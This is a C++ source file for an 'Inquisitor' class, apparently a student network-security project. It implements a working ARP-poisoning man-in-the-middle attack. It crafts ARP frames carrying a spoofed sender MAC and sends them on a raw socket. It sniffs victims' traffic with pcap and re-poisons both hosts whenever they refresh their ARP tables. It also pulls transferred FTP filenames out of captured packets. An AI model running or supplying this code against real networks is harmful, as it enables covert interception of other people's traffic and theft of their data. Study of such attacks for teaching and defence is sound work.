#include "../../include/class/Inquisitor.hpp"

Inquisitor::Inquisitor()
{
        memset(this->_src_mac, 0, 6);
        memset(this->_src_ipv4, 0, 4);
        memset(this->_target_mac, 0, 6);
        memset(this->_target_ipv4, 0, 4);
        this->_init();
}

Inquisitor::Inquisitor(const uint8_t *src_mac, const uint8_t *src_ipv4, const uint8_t *target_mac, const uint8_t *target_ipv4)
{
        memcpy(this->_src_mac, src_mac, 6);
        memcpy(this->_src_ipv4, src_ipv4, 4);
        memcpy(this->_target_mac, target_mac, 6);
        memcpy(this->_target_ipv4, target_ipv4, 4);
        this->_init();
}

Inquisitor::Inquisitor(const Inquisitor &other)
{
        *this = other;
}

Inquisitor::~Inquisitor()
{
        if (this->_sock_fd > 0)
                close(this->_sock_fd);
        if (this->_pcap_hdl)
                pcap_close(this->_pcap_hdl);
}

Inquisitor &Inquisitor::operator=(const Inquisitor &other)
{
        if (this != &other)
        {
                memcpy(this->_src_mac, other._src_mac, 6);
                memcpy(this->_src_ipv4, other._src_ipv4, 4);
                memcpy(this->_target_mac, other._target_mac, 6);
                memcpy(this->_target_ipv4, other._target_ipv4, 4);

                this->_sock_fd = other._sock_fd;
                this->_interface = other._interface;
                this->_if_idx = other._if_idx;
                this->_if_mac = other._if_mac;
                this->_sock_addr = other._sock_addr;
                this->_socket_ready = other._socket_ready;

                memcpy(this->_buffer, other._buffer, BUFFER_SIZE);
                memcpy(this->_eth_header, other._eth_header, sizeof(t_ether_header));
                this->_opcode = other._opcode;
                this->_hardware_type = other._hardware_type;
                this->_spoofing = other._spoofing;
                memcpy(this->_arp_header, other._arp_header, sizeof(t_arp_header));
                this->_arp_frame_ready = other._arp_frame_ready;

                this->_pcap_hdl = other._pcap_hdl;
        }
        return *this;
}

bool Inquisitor::send_arp_frame()
{
        if (!this->_socket_ready && !this->_set_socket())
        {
                if (this->_sock_fd > 0)
                        close(this->_sock_fd);
                this->_sock_fd = 0;

                memset(&this->_if_idx, 0, sizeof(t_ifreq));
                memset(&this->_if_mac, 0, sizeof(t_ifreq));
                memset(&this->_sock_addr, 0, sizeof(t_sockaddr_ll));
                return false;
        }
        if (!this->_arp_frame_ready)
                this->_set_arp_frame();

        return this->_send_frame();
}

void Inquisitor::listen_traffic(const bool &verbose)
{
        char err_buf[PCAP_ERRBUF_SIZE];
        memset(err_buf, 0, PCAP_ERRBUF_SIZE);
        this->_pcap_hdl = pcap_open_live(this->_interface.c_str(), BUFSIZ, 1, 1000, err_buf);
        if (this->_pcap_hdl == nullptr)
        {
                std::cerr << "Inquisitor: [ ERROR ] pcap_open_live(" << this->_interface << ", " << BUFSIZ << ", 1, 1000, " << &err_buf << "): " << strerror(errno) << std::endl;
                return;
        }

        t_pcap_pkthdr header;
        while (true)
        {
                const uchar *packet = pcap_next(this->_pcap_hdl, &header);
                if (err_buf[0])
                {
                        std::cerr << "Inquisitor: [ ERROR ] pcap: " << err_buf << std::endl;
                        memset(err_buf, 0, PCAP_ERRBUF_SIZE);
                }
                if (!packet)
                        continue;
                this->_print_packet(packet, header.len, verbose);
        }
}

void Inquisitor::_print_packet(const uchar *packet, const bpf_u_int32 &header_len, const bool &verbose)
{
        const int nl_protocol = this->_print_dll(packet, verbose);
        if (nl_protocol < 0)
        {
                if (nl_protocol == -2)
                {
                        std::cout << std::endl
                                  << "Inquisitor: [ INFO ] source & target just updated ARP table, performing another ARP spoofing... " << std::endl;
                        sleep(3);

                        uint8_t src_mac[6];
                        uint8_t src_ipv4[4];

                        this->send_arp_frame();
                        memcpy(src_mac, this->_src_mac, 6);
                        memcpy(src_ipv4, this->_src_ipv4, 4);
                        this->set_src_mac(this->_target_mac);
                        this->set_src_ipv4(this->_target_ipv4);
                        this->set_target_mac(src_mac);
                        this->set_target_ipv4(src_ipv4);
                        this->send_arp_frame();
                        std::cout << "[ OK ]" << std::endl;
                }
                return;
        }
        const uint8_t tl_protocol = this->_print_nl(packet, nl_protocol, verbose);
        const size_t tl_size = this->_print_tl(packet, tl_protocol, verbose);
        this->_print_al(packet, tl_size, header_len, verbose);
}

int Inquisitor::_print_dll(const uchar *packet, const bool &verbose) const
{
        const t_ether_header *eth_header = reinterpret_cast<const t_ether_header *>(packet);

        const std::string src_mac = ether_ntoa(reinterpret_cast<const t_ether_addr *>(&eth_header->ether_shost));
        if (src_mac == this->_ifreq_to_mac_string())
                return -1;
        if (src_mac != this->_mac_to_string(this->_src_mac, false) && src_mac != this->_mac_to_string(this->_target_mac, false))
                return -1;
        const std::string dst_mac = ether_ntoa(reinterpret_cast<const t_ether_addr *>(&eth_header->ether_dhost));

        const uint16_t nl_protocol = ntohs(eth_header->ether_type);
        if (nl_protocol == ETHERTYPE_ARP)
                return (dst_mac == "ff:ff:ff:ff:ff:ff" ? -2 : -1);

        if (!verbose)
                return nl_protocol;
        std::cout << std::endl
                  << "------- packet captured -------" << std::endl;
        std::cout << "[ DATA LINK LAYER ]" << std::endl;
        std::cout << "Source MAC: " << src_mac << std::endl;
        std::cout << "Destination MAC: " << dst_mac << std::endl;

        std::string nl_protocol_str;
        if (nl_protocol == ETHERTYPE_IP)
                nl_protocol_str = "IPv4";
        else if (nl_protocol == ETHERTYPE_IPV6)
                nl_protocol_str = "IPv6";
        else if (nl_protocol == ETHERTYPE_VLAN)
                nl_protocol_str = "VLAN";
        else if (nl_protocol == ETHERTYPE_LOOPBACK)
                nl_protocol_str = "LOOPBACK";
        else
                nl_protocol_str = "UNKNOWN";
        std::cout << "Network layer protocol: " << nl_protocol_str << std::endl;
        return nl_protocol;
}

uint8_t Inquisitor::_print_nl(const uchar *packet, const uint16_t &protocol, const bool &verbose) const
{
        if (verbose)
                std::cout << std::endl
                          << "[ NETWORK LAYER ]" << std::endl;
        if (protocol == ETHERTYPE_IP)
        {
                const t_ip *ip_header = reinterpret_cast<const t_ip *>(packet + sizeof(t_ether_header));
                const uint8_t tl_protocol = ip_header->ip_p;

                if (!verbose)
                        return tl_protocol;
                std::cout << "Source IP: " << inet_ntoa(ip_header->ip_src) << std::endl;
                std::cout << "Destination IP: " << inet_ntoa(ip_header->ip_dst) << std::endl;

                std::string tl_protocol_str;
                if (tl_protocol == IPPROTO_TCP)
                        tl_protocol_str = "TCP";
                else if (tl_protocol == IPPROTO_UDP)
                        tl_protocol_str = "UDP";
                else if (tl_protocol == IPPROTO_ICMP)
                        tl_protocol_str = "ICMP";
                else
                        tl_protocol_str = "UNKNOWN";
                std::cout << "Transport layer protocol: " << tl_protocol_str << std::endl;
                return tl_protocol;
        }
        else if (protocol == ETHERTYPE_ARP)
        {
                t_arphdr *arp_header = (t_arphdr *)(packet + sizeof(t_ether_header));
                uchar *arp_data = (uchar *)(arp_header + 1);

                uchar *sender_mac = arp_data;
                uchar *sender_ip = arp_data + 6;
                uchar *target_mac = arp_data + 10;
                uchar *target_ip = arp_data + 16;

                if (!verbose)
                        return IPPROTO_NONE;
                std::cout << "Sender MAC: " << this->_mac_to_string(sender_mac) << std::endl;
                std::cout << "Sender IP: " << inet_ntoa(*reinterpret_cast<t_in_addr *>(sender_ip)) << std::endl;
                std::cout << "Target MAC: " << this->_mac_to_string(target_mac) << std::endl;
                std::cout << "Target IP: " << inet_ntoa(*reinterpret_cast<t_in_addr *>(target_ip)) << std::endl;

                const uint16_t opcode = ntohs(arp_header->ar_op);
                std::string opcode_str;
                if (opcode == ARPOP_REQUEST)
                        opcode_str = "Request";
                else if (opcode == ARPOP_REPLY)
                        opcode_str = "Reply";
                else
                        opcode_str = "Unknown";
                std::cout << "Type: " << opcode_str << std::endl;
        }
        else if (verbose)
                std::cout
                    << "Empty or not supported." << std::endl;
        return IPPROTO_NONE;
}

size_t Inquisitor::_print_tl(const uchar *packet, const uint8_t &protocol, const bool &verbose) const
{
        if (verbose)
                std::cout << std::endl
                          << "[ TRANSPORT LAYER ]" << std::endl;
        size_t tl_size = 0;
        if (protocol == IPPROTO_TCP)
        {
                tl_size = sizeof(t_tcphdr);
                if (!verbose)
                        return tl_size;
                const t_tcphdr *tcp_header = reinterpret_cast<const t_tcphdr *>(packet + sizeof(t_ether_header) + sizeof(t_ip));
                std::cout << "Source Port: " << ntohs(tcp_header->th_sport) << std::endl;
                std::cout << "Destination Port: " << ntohs(tcp_header->th_dport) << std::endl;

                const uint8_t flags = tcp_header->th_flags;
                std::string flags_str;
                if (flags & TH_SYN)
                        flags_str += "SYN ";
                if (flags & TH_ACK)
                        flags_str += "ACK ";
                if (flags & TH_URG)
                        flags_str += "URG ";
                if (flags & TH_PUSH)
                        flags_str += "PUSH ";
                if (flags & TH_RST)
                        flags_str += "RST ";
                if (flags & TH_FIN)
                        flags_str += "FIN ";
                if (flags & 0x40)
                        flags_str += "ECE ";
                if (flags & 0x80)
                        flags_str += "CWR ";
                if (!flags_str.empty())
                        flags_str.pop_back();
                std::cout << "Flags: " << flags_str << std::endl;
        }
        else if (protocol == IPPROTO_UDP)
        {
                tl_size = sizeof(t_udphdr);
                if (!verbose)
                        return tl_size;
                const t_udphdr *udp_header = reinterpret_cast<const t_udphdr *>(packet + sizeof(t_ether_header) + sizeof(t_ip));
                std::cout << "Source Port: " << ntohs(udp_header->uh_sport) << std::endl;
                std::cout << "Destination Port: " << ntohs(udp_header->uh_dport) << std::endl;
        }
        else if (protocol == IPPROTO_ICMP)
        {
                tl_size = sizeof(t_icmphdr);
                if (!verbose)
                        return tl_size;
                const t_icmphdr *icmp_header = reinterpret_cast<const t_icmphdr *>(packet + sizeof(t_ether_header) + sizeof(t_ip));
                std::cout << "Type: " << (int)(icmp_header->type) << std::endl;
                std::cout << "Code: " << (int)(icmp_header->code) << std::endl;
        }
        else if (verbose)
                std::cout << "Empty or not supported." << std::endl;
        return tl_size;
}

void Inquisitor::_print_al(const uchar *packet, const size_t &tl_size, const bpf_u_int32 &header_len, const bool &verbose) const
{
        if (verbose)
                std::cout << std::endl
                          << "[ APPLICATION LAYER ]" << std::endl;

        const int payload_length = header_len - (sizeof(t_ether_header) + sizeof(t_ip) + tl_size);
        if (!payload_length && verbose)
                std::cout << "Empty." << std::endl;
        else
        {
                std::string buffer;
                const uchar *payload = packet + sizeof(t_ether_header) + sizeof(t_ip) + tl_size;
                for (int i = 0; i < payload_length; ++i)
                {
                        if (isprint(payload[i]))
                                buffer += payload[i];
                        else
                                buffer += '.';

                        if ((i + 1) % 64 == 0)
                                buffer += '\n';
                }
                if (verbose)
                        std::cout << buffer << std::endl;
                else if (!buffer.empty())
                {
                        size_t pos = buffer.find("Opening BINARY mode data connection for ");
                        if (pos != std::string::npos)
                        {
                                buffer = buffer.substr(pos + 40);
                                pos = buffer.find(' ');
                                if (pos != std::string::npos)
                                        buffer = buffer.substr(0, pos);
                                std::cout << "Filename: " << buffer << std::endl;
                        }
                }
        }
        if (verbose)
                std::cout << std::endl
                          << "-------- end of packet --------" << std::endl;
}

std::string Inquisitor::_ifreq_to_mac_string() const
{
        std::ostringstream stream;
        const uchar *mac_addr = reinterpret_cast<const uchar *>(this->_if_mac.ifr_hwaddr.sa_data);
        for (short i = 0; i < 6; ++i)
        {
                stream << std::hex << static_cast<int>(mac_addr[i]);
                if (i < 5)
                        stream << ":";
        }
        return stream.str();
}

std::string Inquisitor::_mac_to_string(const uchar *mac_address, const bool &add_zeros) const
{
        std::stringstream ss;
        if (add_zeros)
                ss << std::hex << std::setfill('0');
        else
                ss << std::hex;

        for (short i = 0; i < 6; ++i)
        {
                if (add_zeros)
                        ss << std::setw(2);
                ss << static_cast<int>(mac_address[i]);
                if (i < 5)
                        ss << ":";
        }
        return ss.str();
}

bool Inquisitor::_set_socket()
{
        if (this->_init_socket(AF_PACKET, SOCK_RAW, ETH_P_ALL) &&
            this->_init_ifreq(this->_if_idx, SIOCGIFINDEX) &&
            this->_init_ifreq(this->_if_mac, SIOCGIFHWADDR))
        {
                this->_init_sockaddr_ll(htons(ETH_P_ARP));
                this->_socket_ready = true;
        }
        return this->_socket_ready;
}

void Inquisitor::_set_arp_frame()
{
        this->_init_eth_header(ETH_P_ARP);
        this->_init_arp_header();
        this->_arp_frame_ready = true;
}

void Inquisitor::_init()
{
        this->_sock_fd = 0;
        this->_interface = DEFAULT_ARP_IF;
        memset(&this->_if_idx, 0, sizeof(t_ifreq));
        memset(&this->_if_mac, 0, sizeof(t_ifreq));
        memset(&this->_sock_addr, 0, sizeof(t_sockaddr_ll));
        this->_socket_ready = false;

        memset(this->_buffer, 0, BUFFER_SIZE);
        this->_eth_header = reinterpret_cast<t_ether_header *>(this->_buffer);
        this->_opcode = ARP_REQUEST;
        this->_hardware_type = DEFAULT_ARP_HARDW_TYPE;
        this->_spoofing = false;
        this->_arp_header = reinterpret_cast<t_arp_header *>(this->_buffer + sizeof(t_ether_header));
        this->_arp_frame_ready = false;

        this->_pcap_hdl = NULL;
}

bool Inquisitor::_init_socket(const int &domain, const int &type, const uint16_t &protocol)
{
        this->_sock_fd = socket(domain, type, htons(protocol));
        if (this->_sock_fd < 0)
        {
                std::cerr << "Inquisitor: [ ERROR ] socket(" << domain << ", " << type << ", " << protocol << "): " << strerror(errno) << std::endl;
                return false;
        }
        return true;
}

bool Inquisitor::_init_ifreq(t_ifreq &if_struct, const ulong &ioctl_request)
{
        strncpy(if_struct.ifr_name, this->_interface.c_str(), IFNAMSIZ - 1);
        if (ioctl(this->_sock_fd, ioctl_request, &if_struct) < 0)
        {
                std::cerr << "Inquisitor: [ ERROR ] ioctl(" << this->_sock_fd << ", " << ioctl_request << ", " << &if_struct << "): " << strerror(errno) << std::endl;
                return false;
        }
        return true;
}

void Inquisitor::_init_sockaddr_ll(const ushort &protocol)
{
        this->_sock_addr.sll_ifindex = this->_if_idx.ifr_ifindex;
        this->_sock_addr.sll_protocol = protocol;
}

void Inquisitor::_init_eth_header(const uint16_t &frame_type)
{
        this->_eth_header->ether_type = htons(frame_type);
        memcpy(this->_eth_header->ether_shost, this->_if_mac.ifr_hwaddr.sa_data, 6);
        memcpy(this->_eth_header->ether_dhost, this->_target_mac, 6);
}

void Inquisitor::_init_arp_header()
{
        uint8_t e_target_mac[6];
        const uint8_t broadcast_mac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

        if (!memcmp(this->_target_mac, broadcast_mac, 6))
                memset(e_target_mac, 0, 6);
        else
                memcpy(e_target_mac, this->_target_mac, 6);

        this->_arp_header->hardware_type = htons(this->_hardware_type);
        this->_arp_header->protocol_type = htons(ETH_P_IP);
        this->_arp_header->hardware_len = 6;
        this->_arp_header->protocol_len = 4;

        this->_arp_header->opcode = htons(this->_opcode);
        if (this->_spoofing)
                memcpy(this->_arp_header->sender_mac, this->_if_mac.ifr_hwaddr.sa_data, 6);
        else
                memcpy(this->_arp_header->sender_mac, this->_src_mac, 6);
        memcpy(this->_arp_header->sender_ip, this->_src_ipv4, 4);
        memcpy(this->_arp_header->target_mac, e_target_mac, 6);
        memcpy(this->_arp_header->target_ip, this->_target_ipv4, 4);
}

bool Inquisitor::_send_frame()
{
        const size_t size = sizeof(t_ether_header) + sizeof(t_arp_header);

        if (sendto(this->_sock_fd, this->_buffer, size, 0, reinterpret_cast<t_sockaddr *>(&this->_sock_addr), sizeof(t_sockaddr_ll)) < 0)
        {
                std::cerr << "Inquisitor: [ ERROR ] sendto(" << this->_sock_fd << ", " << this->_buffer << ", " << BUFFER_SIZE << ", 0, " << &this->_sock_addr << ", " << sizeof(t_sockaddr_ll) << "): " << strerror(errno) << std::endl;
                return false;
        }
        return true;
}

const uint8_t *Inquisitor::get_src_mac() const
{
        return this->_src_mac;
}

const uint8_t *Inquisitor::get_src_ipv4() const
{
        return this->_src_ipv4;
}

const uint8_t *Inquisitor::get_target_mac() const
{
        return this->_target_mac;
}

const uint8_t *Inquisitor::get_target_ipv4() const
{
        return this->_target_ipv4;
}

const int &Inquisitor::get_sock_fd() const
{
        return this->_sock_fd;
}

const std::string &Inquisitor::get_interface() const
{
        return this->_interface;
}

const t_ifreq &Inquisitor::get_if_idx() const
{
        return this->_if_idx;
}

const t_ifreq &Inquisitor::get_if_mac() const
{
        return this->_if_mac;
}

const t_sockaddr_ll &Inquisitor::get_sock_addr() const
{
        return this->_sock_addr;
}

const bool &Inquisitor::get_socket_ready() const
{
        return this->_socket_ready;
}

const uchar *Inquisitor::get_buffer() const
{
        return this->_buffer;
}

const t_ether_header *Inquisitor::get_eth_header() const
{
        return this->_eth_header;
}

const ushort &Inquisitor::get_opcode() const
{
        return this->_opcode;
}

const ushort &Inquisitor::get_hardware_type() const
{
        return this->_hardware_type;
}

const bool &Inquisitor::get_spoofing() const
{
        return this->_spoofing;
}

const t_arp_header *Inquisitor::get_arp_header() const
{
        return this->_arp_header;
}

const bool &Inquisitor::get_arp_frame_ready() const
{
        return this->_arp_frame_ready;
}

const pcap_t *Inquisitor::get_pcap_hdl() const
{
        return this->_pcap_hdl;
}

void Inquisitor::set_src_mac(const uint8_t *src_mac)
{
        memcpy(this->_src_mac, src_mac, 6);
        if (this->_buffer[0])
                memset(this->_buffer, 0, BUFFER_SIZE);
        this->_arp_frame_ready = false;
}

void Inquisitor::set_src_ipv4(const uint8_t *src_ipv4)
{
        memcpy(this->_src_ipv4, src_ipv4, 4);
        if (this->_buffer[0])
                memset(this->_buffer, 0, BUFFER_SIZE);
        this->_arp_frame_ready = false;
}

void Inquisitor::set_target_mac(const uint8_t *target_mac)
{
        memcpy(this->_target_mac, target_mac, 6);
        if (this->_buffer[0])
                memset(this->_buffer, 0, BUFFER_SIZE);
        this->_arp_frame_ready = false;
}

void Inquisitor::set_target_ipv4(const uint8_t *target_ipv4)
{
        memcpy(this->_target_ipv4, target_ipv4, 4);
        if (this->_buffer[0])
                memset(this->_buffer, 0, BUFFER_SIZE);
        this->_arp_frame_ready = false;
}

void Inquisitor::set_interface(const std::string &interface)
{
        this->_interface = interface;

        if (this->_sock_fd > 0)
                close(this->_sock_fd);
        this->_sock_fd = 0;

        memset(&this->_if_idx, 0, sizeof(t_ifreq));
        memset(&this->_if_mac, 0, sizeof(t_ifreq));
        memset(&this->_sock_addr, 0, sizeof(t_sockaddr_ll));
        this->_socket_ready = false;
}

void Inquisitor::set_opcode(const ushort &opcode)
{
        this->_opcode = opcode;
        if (this->_buffer[0])
                memset(this->_buffer, 0, BUFFER_SIZE);
        this->_arp_frame_ready = false;
}

void Inquisitor::set_hardware_type(const ushort &hardware_type)
{
        this->_hardware_type = hardware_type;
        if (this->_buffer[0])
                memset(this->_buffer, 0, BUFFER_SIZE);
        this->_arp_frame_ready = false;
}

void Inquisitor::set_spoofing(const bool &spoofing)
{
        this->_spoofing = spoofing;
        if (this->_buffer[0])
                memset(this->_buffer, 0, BUFFER_SIZE);
        this->_arp_frame_ready = false;
}
